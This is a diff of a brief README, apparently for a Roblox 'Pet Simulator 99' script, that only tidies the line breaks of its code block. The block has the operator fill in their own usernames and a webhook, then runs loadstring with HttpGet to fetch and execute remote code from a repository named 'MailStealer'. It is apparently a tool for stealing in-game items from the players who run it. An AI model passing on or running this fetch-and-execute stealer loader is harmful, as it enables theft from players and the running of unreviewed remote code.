@@ -1,11 +1,9 @@
 # Script With Tutorial !
 
-```Username = "YOUR USERNAME"
-
+```
+Username = "YOUR USERNAME"
 Username2 = "ALT USERNAME"
-
 Loading = "LOADING"
-
 Webhook = "YOUR WEBHOOK"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/GengarScripts/MailStealer/main/PetSimulator99"))()
